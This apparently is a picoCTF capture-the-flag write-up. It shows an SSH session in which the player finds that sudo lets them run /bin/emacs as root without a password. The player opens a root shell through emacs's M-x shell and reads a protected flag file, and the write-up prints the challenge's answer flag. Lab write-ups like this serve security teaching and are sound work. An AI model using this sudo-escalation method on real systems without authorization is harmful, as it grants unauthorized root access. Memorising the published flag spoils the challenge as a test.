## Prerequisites:
Connect to the challenge by using the SSH credentials provided the we see below information:
```bash
┌──(tanush㉿kali)-[~]
└─$ ssh -p 59136 ctf-player@green-hill.picoctf.net
The authenticity of host '[green-hill.picoctf.net]:59136 ([3.18.205.4]:59136)' can't be established.
ED25519 key fingerprint is: SHA256:6yCIZ8GT1zu0g1/pjVc7t+aLNpxCPniM/MF6w7pTUx0
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[green-hill.picoctf.net]:59136' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
ctf-player@green-hill.picoctf.net's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 6.17.0-1019-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

ctf-player@challenge:~$ ls -al
total 16
drwxr-xr-x 1 ctf-player ctf-player   20 Aug 17 09:43 .
drwxr-xr-x 1 root       root         24 Mar  9 21:32 ..
-rw-r--r-- 1 ctf-player ctf-player  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 ctf-player ctf-player 3771 Feb 25  2020 .bashrc
drwx------ 2 ctf-player ctf-player   34 Aug 17 09:43 .cache
-rw-r--r-- 1 ctf-player ctf-player  807 Feb 25  2020 .profile
-r--r----- 1 root       root         31 Mar  9 21:32 flag.txt
ctf-player@challenge:~$ cat flag.txt 
cat: flag.txt: Permission denied
ctf-player@challenge:~$ 
```
we see that there is a flag file that is present but we don't have the permissions to read the file. I try to find any privilege escalation paths be using below command and obtain below information:
```bash
ctf-player@challenge:~$ sudo -l
Matching Defaults entries for ctf-player on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/emacs
ctf-player@challenge:~$ 
```
we obtain a text editor that can be run without using password, we can use emacs command execution method to spawn a shell inside.
use below command:
```bash
sudo /bin/emacs
```
then press Esc and x to enter command prompt then enter shell to open a shell buffer inside emacs after this is done we will have our root shell:
![[Pasted image 20260817152824.png]]
then we can read the flag present in the ctf-palyer.

## Final Flag:
```text
picoCTF{ju57_5ud0_17_4c6f730f}
```

